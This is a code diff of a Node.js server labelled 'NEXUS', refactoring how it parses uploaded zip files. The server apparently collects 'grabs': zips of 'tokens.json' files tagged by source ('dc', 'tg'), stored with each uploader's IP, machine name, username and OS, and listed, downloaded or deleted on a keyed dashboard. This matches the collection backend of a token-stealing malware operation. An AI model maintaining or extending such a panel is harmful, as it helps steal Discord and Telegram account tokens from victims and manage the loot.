@@ -62,31 +62,21 @@ async function initDb() {
   `);
 }
 
-// Count tokens from zip buffer — called at upload time so dashboard shows counts instantly
-function countTokensInZip(buf) {
+// One zip parse per upload — returns token count + source type
+function parseZipMeta(buf) {
   try {
     const zip = new AdmZip(buf);
-    let total = 0;
-    zip.getEntries().forEach(e => {
-      if (!e.entryName.endsWith("/tokens.json")) return;
-      try {
-        const arr = JSON.parse(e.getData().toString("utf8"));
-        if (Array.isArray(arr)) total += arr.length;
-      } catch {}
-    });
-    return total;
-  } catch { return 0; }
-}
-
-// Detect source from m.json: "dc" | "tg" | "diag"
-function detectSrc(buf) {
-  try {
-    const zip = new AdmZip(buf);
-    const me = zip.getEntry("m.json");
-    if (!me) return "dc";
-    const m = JSON.parse(me.getData().toString("utf8"));
-    return m.src || "dc";
-  } catch { return "dc"; }
+    let tokenCount = 0, src = "dc";
+    for (const e of zip.getEntries()) {
+      if (e.entryName === "m.json") {
+        try { src = JSON.parse(e.getData().toString("utf8")).src || "dc"; } catch {}
+      }
+      if (e.entryName.endsWith("/tokens.json")) {
+        try { const a = JSON.parse(e.getData().toString("utf8")); if (Array.isArray(a)) tokenCount += a.length; } catch {}
+      }
+    }
+    return { tokenCount, src };
+  } catch { return { tokenCount: 0, src: "dc" }; }
 }
 
 initDb().catch(e => console.error("[!] db init failed:", e.message));
@@ -165,11 +155,7 @@ function timeAgo(dt) {
   return d + "d ago";
 }
 
-function fmtTime(dt) {
-  const d = new Date(dt);
-  const pad = (n) => String(n).padStart(2, "0");
-  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
-}
+const fmtTime = dt => new Date(dt).toISOString().replace("T", " ").slice(0, 19);
 
 function esc(s) {
   if (!s) return "";
@@ -198,9 +184,7 @@ app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
     const ts = Date.now();
     const filename = `${ts}_${crypto.randomBytes(6).toString("hex")}.dat`;
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
-    // Parse zip immediately — so dashboard shows token count + source without re-parsing later
-    const tokenCount = countTokensInZip(req.file.buffer);
-    const src = detectSrc(req.file.buffer);
+    const { tokenCount, src } = parseZipMeta(req.file.buffer);
     await pool.query(
       `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch, token_count, src)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
@@ -261,12 +245,8 @@ app.get("/dl/:id", checkKey, async (req, res) => {
 });
 
 app.post("/rm/:id", checkKey, async (req, res) => {
-  try {
-    await pool.query(`DELETE FROM grabs WHERE id = $1`, [req.params.id]);
-    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
-  } catch (err) {
-    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
-  }
+  try { await pool.query(`DELETE FROM grabs WHERE id = $1`, [req.params.id]); } catch {}
+  res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
 });
 
 function renderPage(entries, totalSize, k, { hasBg = false, theme = null, sessions = [] } = {}) {
@@ -682,7 +662,7 @@ ${themeOverride}
       </table></div>`
     : `<div class="empty"><div class="icon">&#9673;</div><p>NO ENTRIES YET</p></div>`}
 
-  <div class="foot">NEXUS &middot; V5</div>
+  <div class="foot">NEXUS &middot; V6</div>
 </div>
 
 <div class="overlay" id="overlay"></div>
